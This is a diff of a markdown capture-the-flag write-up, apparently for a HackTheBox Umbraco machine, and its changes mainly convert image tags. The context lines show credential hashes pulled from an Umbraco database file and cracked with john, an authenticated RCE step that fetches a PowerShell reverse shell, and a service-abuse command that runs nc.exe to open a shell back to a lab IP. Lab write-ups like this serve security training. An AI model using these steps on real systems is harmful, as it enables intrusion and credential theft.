@@ -73,7 +73,6 @@ cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
 
 If we use `strings` on it, we would find a load of input. At the top, it seems that there are SHA1 hashes present:
 
-{% code overflow="wrap" %}
 ```
 $ strings Umbraco.sdf
 Administratoradmindefaulten-US
@@ -85,7 +84,6 @@ smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnI
 ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 ```
-{% endcode %}
 
 The hash can be cracked via `john`.
 
@@ -115,15 +113,15 @@ So now we have some credentials at least.
 
 There were hints that Umbraco was used to host the sites, so let's view port 80. It seems to be a blog page:
 
-<figure><img src="../../../.gitbook/assets/image (2221).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2221).png>)
 
 The login page for the website is located at the `/Umbraco` directory. We can login with the credentials and email we found earlier.
 
-<figure><img src="../../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(380).png>)
 
 After logging in, we can enumerate the version that it is running.
 
-<figure><img src="../../../.gitbook/assets/image (3873).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3873).png>)
 
 This version of Umbraco is vulnerable to an Authenticated RCE exploit:
 
@@ -157,7 +155,7 @@ host = "http://10.129.227.150";
 
 Take note of the `cmd` and `FileName` parameter in the `payload` variable. In my case I just used Powershell to download and execute a reverse shell script.
 
-<figure><img src="../../../.gitbook/assets/image (2517).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2517).png>)
 
 ## Privilege Escalation
 
@@ -216,6 +214,6 @@ We have control over the `UsoSvc` service. With this, we can run commands as the
 <strong>Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'C:\Windows\Tasks\nc.exe 10.10.14.13 4444 -e cmd.exe'
 </strong></code></pre>
 
-<figure><img src="../../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(879).png>)
 
 Rooted!
